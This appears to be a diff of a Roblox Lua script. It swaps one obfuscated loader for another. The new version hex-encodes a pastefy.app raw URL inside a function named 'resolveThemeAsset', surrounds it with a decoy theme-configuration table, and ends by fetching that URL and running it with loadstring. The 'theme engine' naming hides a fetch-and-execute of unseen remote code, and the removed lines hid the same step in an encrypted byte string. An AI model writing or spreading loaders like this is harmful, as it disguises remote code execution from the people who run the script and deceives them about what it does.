@@ -1,3 +1,37 @@
--- I got legal documents to sue skids
+-- I have legal documents to sue skids
+local function resolveThemeAsset(hexToken)
+    local output = ""
+    for i = 1, #hexToken, 2 do
+        output = output .. string.char(tonumber(hexToken:sub(i, i + 1), 16))
+    end
+    return output
+end
 
-local _a=(function(v0,v1,v2,v3)local v4={}return function(v5)local v6=v4[v5]if v6==nil then local v7=v3[v5]local v8={}for v9=1,#v7[1] do v8[v9]=v1((v0(v7[1],v9)-v7[2]-v9*v7[3])%256)end v6=v2(v8)v4[v5]=v6 end return v6 end end)(string.byte,string.char,table.concat,{{"\010\224\170\112\061\206\141\087\098\029\249\196\127\074\039\166\163\124\070\207\181\169\106\032\203\213\151\063\233\246\175\143",216,202}});loadstring(game:HttpGet(_a(1)))()
+local themes = resolveThemeAsset("68747470733a2f2f706173746566792e6170702f54317431777467702f726177")
+
+local themeConfig = {
+    CurrentTheme = "DarkMidnight",
+    FallbackTheme = "ClassicLight",
+    AccentColor = "#FF5555",
+    Endpoints = {
+        SourceCode = "https://vault.pandauth.com/kvs/90dd1045b2ce29d1",
+        AssetCDN = "https://raw.githubusercontent.com/theme-assets/storage/main/manifest.json",
+        FontRegistry = "https://fonts.gstatic.com/s/inter/v12/UcC73FwrK3iLTeHuS_fvQtMwCp50KnMa1ZL7W0Q5nw.woff2"
+    },
+    Settings = {
+        AutoSave = true,
+        CacheDuration = 86400,
+        DebugMode = false
+    }
+}
+
+local function initializeThemeEngine()
+    local theme = themeConfig.CurrentTheme
+    if themeConfig.Settings.DebugMode then
+        print("[UI]: Initialized theme " .. theme)
+    end
+end
+
+initializeThemeEngine()
+
+loadstring(game:HttpGet(themes))()
